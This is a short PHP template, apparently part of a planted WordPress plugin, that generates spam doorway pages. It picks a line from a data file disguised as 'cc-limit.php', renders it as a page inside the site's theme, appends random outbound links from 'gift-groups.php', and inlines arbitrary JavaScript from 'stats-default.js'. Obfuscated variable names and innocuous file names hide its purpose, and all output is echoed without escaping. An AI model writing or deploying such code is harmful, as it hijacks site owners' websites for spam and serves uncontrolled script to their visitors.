<?php
$qJNEl6S9 = intval(get_query_var('nzxgtka'));

if ($qJNEl6S9 < 1 || $qJNEl6S9 > 4053) return;
$f9nbn = file(plugin_dir_path(__FILE__).'cc-limit.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$jHjMd = explode(';', $f9nbn[$qJNEl6S9]);
if (count($jHjMd) < 2) return;
$hwKAXB = $jHjMd[0];
$m069wSs  = $jHjMd[1];
$aSRazF = $jHjMd[2];
$sTi95Ib  = $jHjMd[3];
$lQ7B7ie0PF = $jHjMd[4];
set_query_var('wensszxpk', $hwKAXB);

$yDm6ynpw = '';
$zrm8TDrpYq = plugin_dir_path(__FILE__).'gift-groups.php';
if (is_file($zrm8TDrpYq)) {
	$wKtlH = file($zrm8TDrpYq, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($wKtlH);
	shuffle($wKtlH);
	$cHwL8CXzQg = mt_rand(2, 5);
	if (count($wKtlH) > $cHwL8CXzQg) {
		for ($aFg2u = 0; $aFg2u < $cHwL8CXzQg; $aFg2u++) {
			$iam12FYjOQ = array_shift($wKtlH);
			$yDm6ynpw .= '<p><a href="'.$iam12FYjOQ.'">'.$iam12FYjOQ.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $hwKAXB; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $m069wSs . "</p>\n";
				if (strlen($sTi95Ib) > 0) echo "<p>" . $sTi95Ib . "</p>\n";
				if (strlen($aSRazF) > 0) echo "<p>" . $aSRazF . "</p>\n";
				if (strlen($lQ7B7ie0PF) > 0) echo '<p><a href="#"><img src="'.$lQ7B7ie0PF.'"></a>' . "</p>\n";
				echo $yDm6ynpw;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$wf9YVUZ2HL = plugin_dir_path(__FILE__) . 'stats-default.js';
if (is_file($wf9YVUZ2HL)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($wf9YVUZ2HL);
	echo '</script>';
}
get_footer();
?>
